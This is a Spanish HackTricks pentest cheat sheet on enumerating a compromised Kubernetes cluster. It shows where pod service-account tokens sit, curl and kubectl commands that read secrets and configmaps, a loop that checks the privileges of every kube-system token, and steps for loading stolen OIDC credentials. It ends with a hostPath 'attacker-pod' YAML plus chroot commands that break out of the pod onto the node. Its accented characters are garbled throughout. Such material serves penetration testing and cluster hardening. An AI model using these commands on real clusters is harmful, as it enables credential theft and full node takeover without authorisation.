# Enumeraci√≥n de Kubernetes

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

## Tokens de Kubernetes

Si has comprometido el acceso a una m√°quina, el usuario puede tener acceso a alguna plataforma de Kubernetes. El token generalmente se encuentra en un archivo se√±alado por la **var env `KUBECONFIG`** o **dentro de `~/.kube`**.

En esta carpeta puedes encontrar archivos de configuraci√≥n con **tokens y configuraciones para conectarte al servidor API**. En esta carpeta tambi√©n puedes encontrar una carpeta de cach√© con informaci√≥n recuperada previamente.

Si has comprometido un pod dentro de un entorno de kubernetes, hay otros lugares donde puedes encontrar tokens e informaci√≥n sobre el entorno K8 actual:

### Tokens de Cuenta de Servicio

Antes de continuar, si no sabes qu√© es un servicio en Kubernetes, te sugerir√≠a que **sigas este enlace y leas al menos la informaci√≥n sobre la arquitectura de Kubernetes.**

Tomado de la [documentaci√≥n](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) de Kubernetes:

_‚ÄúCuando creas un pod, si no especificas una cuenta de servicio, se le asigna autom√°ticamente la_ cuenta de servicio _predeterminada en el mismo namespace.‚Äù_

**ServiceAccount** es un objeto gestionado por Kubernetes y utilizado para proporcionar una identidad a los procesos que se ejecutan en un pod.\
Cada cuenta de servicio tiene un secreto relacionado y este secreto contiene un token portador. Este es un JSON Web Token (JWT), un m√©todo para representar reclamaciones de manera segura entre dos partes.

Generalmente **uno** de los directorios:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contiene los archivos:

* **ca.crt**: Es el certificado ca para verificar las comunicaciones de kubernetes
* **namespace**: Indica el namespace actual
* **token**: Contiene el **token de servicio** del pod actual.

Ahora que tienes el token, puedes encontrar el servidor API dentro de la variable de entorno **`KUBECONFIG`**. Para m√°s informaci√≥n ejecuta `(env | set) | grep -i "kuber|kube`**`"`**

El token de cuenta de servicio est√° siendo firmado por la clave que reside en el archivo **sa.key** y validado por **sa.pub**.

Ubicaci√≥n predeterminada en **Kubernetes**:

* /etc/kubernetes/pki

Ubicaci√≥n predeterminada en **Minikube**:

* /var/lib/localkube/certs

### Pods Calientes

_**Los pods calientes son**_ pods que contienen un token de cuenta de servicio privilegiado. Un token de cuenta de servicio privilegiado es un token que tiene permiso para realizar tareas privilegiadas como listar secretos, crear pods, etc.

## RBAC

Si no sabes qu√© es **RBAC**, **lee esta secci√≥n**.

## Aplicaciones GUI

* **k9s**: Una GUI que enumera un cl√∫ster de kubernetes desde la terminal. Revisa los comandos en [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). Escribe `:namespace` y selecciona todo para luego buscar recursos en todos los namespaces.
* **k8slens**: Ofrece algunos d√≠as de prueba gratuita: [https://k8slens.dev/](https://k8slens.dev/)

## CheatSheet de Enumeraci√≥n

Para enumerar un entorno K8s necesitas un par de cosas:

* Un **token de autenticaci√≥n v√°lido**. En la secci√≥n anterior vimos d√≥nde buscar un token de usuario y un token de cuenta de servicio.
* La **direcci√≥n (**_**https://host:port**_**) del API de Kubernetes**. Esto generalmente se puede encontrar en las variables de entorno y/o en el archivo de configuraci√≥n kube.
* **Opcional**: El **ca.crt para verificar el servidor API**. Esto se puede encontrar en los mismos lugares donde se puede encontrar el token. Esto es √∫til para verificar el certificado del servidor API, pero usando `--insecure-skip-tls-verify` con `kubectl` o `-k` con `curl` no necesitar√°s esto.

Con esos detalles puedes **enumerar kubernetes**. Si el **API** por alguna raz√≥n es **accesible** a trav√©s de **Internet**, puedes simplemente descargar esa informaci√≥n y enumerar la plataforma desde tu host.

Sin embargo, generalmente el **servidor API est√° dentro de una red interna**, por lo tanto necesitar√°s **crear un t√∫nel** a trav√©s de la m√°quina comprometida para acceder a √©l desde tu m√°quina, o puedes **subir el** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binario, o usar **`curl/wget/cualquier cosa`** para realizar solicitudes HTTP en bruto al servidor API.

### Diferencias entre los verbos `list` y `get`

Con permisos de **`get`** puedes acceder a informaci√≥n de activos espec√≠ficos (_opci√≥n `describe` en `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si tienes el permiso **`list`**, se te permite ejecutar solicitudes API para listar un tipo de activo (_`opci√≥n get en kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si tienes el permiso **`watch`**, se te permite ejecutar solicitudes API para monitorear activos:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Abren una conexi√≥n de streaming que te devuelve el manifiesto completo de un Deployment cada vez que cambia (o cuando se crea uno nuevo).

{% hint style="danger" %}
Los siguientes comandos de `kubectl` indican solo c√≥mo listar los objetos. Si deseas acceder a los datos, necesitas usar `describe` en lugar de `get`
{% endhint %}

### Usando curl

Desde dentro de un pod, puedes usar varias variables de entorno:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Por defecto, el pod puede **acceder** al **servidor kube-api** en el nombre de dominio **`kubernetes.default.svc`** y puedes ver la red kube en **`/etc/resolv.config`** ya que aqu√≠ encontrar√°s la direcci√≥n del servidor DNS de kubernetes (el ".1" del mismo rango es el punto final kube-api).
{% endhint %}

### Usando kubectl

Teniendo el token y la direcci√≥n del servidor API, usas kubectl o curl para acceder a √©l como se indica aqu√≠:

Por defecto, el APISERVER se comunica con el esquema `https://`

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> si no hay `https://` en la URL, puede que obtengas un error como Bad Request.

Puedes encontrar un [**cheatsheet oficial de kubectl aqu√≠**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). El objetivo de las siguientes secciones es presentar de manera ordenada diferentes opciones para enumerar y entender el nuevo K8s al que has obtenido acceso.

Para encontrar la solicitud HTTP que `kubectl` env√≠a, puedes usar el par√°metro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuraci√≥n Actual

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si lograste robar las credenciales de algunos usuarios, puedes **configurarlas localmente** usando algo como:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtener Recursos Soportados

Con esta informaci√≥n sabr√°s todos los servicios que puedes listar

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Obtener Privilegios Actuales

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Otra forma de verificar tus privilegios es utilizando la herramienta: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

Puedes aprender m√°s sobre **Kubernetes RBAC** en:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Una vez que sepas qu√© privilegios** tienes, revisa la siguiente p√°gina para averiguar **si puedes abusar de ellos** para escalar privilegios:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtener roles de otros

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtener namespaces

Kubernetes soporta **m√∫ltiples cl√∫steres virtuales** respaldados por el mismo cl√∫ster f√≠sico. Estos cl√∫steres virtuales se llaman **namespaces**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Obtener secretos

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si puedes leer secretos, puedes usar las siguientes l√≠neas para obtener los privilegios relacionados con cada token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtener Cuentas de Servicio

Como se discuti√≥ al principio de esta p√°gina **cuando se ejecuta un pod, generalmente se le asigna una cuenta de servicio**. Por lo tanto, listar las cuentas de servicio, sus permisos y d√≥nde se est√°n ejecutando puede permitir a un usuario escalar privilegios.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Obtener Despliegues

Los despliegues especifican los **componentes** que necesitan ser **ejecutados**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtener Pods

Los Pods son los **contenedores** que **se ejecutar√°n**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obtener Servicios

Kubernetes **services** se utilizan para **exponer un servicio en un puerto e IP espec√≠ficos** (que actuar√° como balanceador de carga para los pods que realmente est√°n ofreciendo el servicio). Esto es interesante para saber d√≥nde puedes encontrar otros servicios para intentar atacar.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obtener nodos

Obt√©n todos los **nodos configurados dentro del cl√∫ster**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obtener DaemonSets

**DaeamonSets** permite asegurar que un **pod espec√≠fico est√© en ejecuci√≥n en todos los nodos** del cl√∫ster (o en los seleccionados). Si eliminas el DaemonSet, los pods gestionados por √©l tambi√©n ser√°n eliminados.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obtener cronjob

Los cron jobs permiten programar el lanzamiento de un pod que realizar√° alguna acci√≥n utilizando una sintaxis similar a crontab.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obtener configMap

configMap siempre contiene mucha informaci√≥n y archivos de configuraci√≥n que proporcionan a las aplicaciones que se ejecutan en Kubernetes. Por lo general, puedes encontrar muchas contrase√±as, secretos y tokens que se utilizan para conectarse y validar otros servicios internos/externos.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### Obtener Pol√≠ticas de Red / Pol√≠ticas de Red de Cilium

{% tabs %}
{% tab title="Primera Pesta√±a" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### Obtener Todo / Todo

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **Obtener todos los recursos gestionados por helm**

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{% endtab %}
{% endtabs %}

### **Obtener consumos de Pods**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Escapando del pod

Si puedes crear nuevos pods, es posible que puedas escapar de ellos hacia el nodo. Para hacerlo, necesitas crear un nuevo pod utilizando un archivo yaml, cambiarte al pod creado y luego chroot en el sistema del nodo. Puedes usar pods ya existentes como referencia para el archivo yaml, ya que muestran im√°genes y rutas existentes.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> si necesitas crear un pod en un nodo espec√≠fico, puedes usar el siguiente comando para obtener las etiquetas en el nodo
>
> `k get nodes --show-labels`
>
> Com√∫nmente, kubernetes.io/hostname y node-role.kubernetes.io/master son buenas etiquetas para seleccionar.

Luego creas tu archivo attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Despu√©s de eso, creas el pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Ahora puedes cambiar al pod creado de la siguiente manera
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Y finalmente te chroot en el sistema del nodo.
```bash
chroot /root /bin/bash
```
Informaci√≥n obtenida de: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referencias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
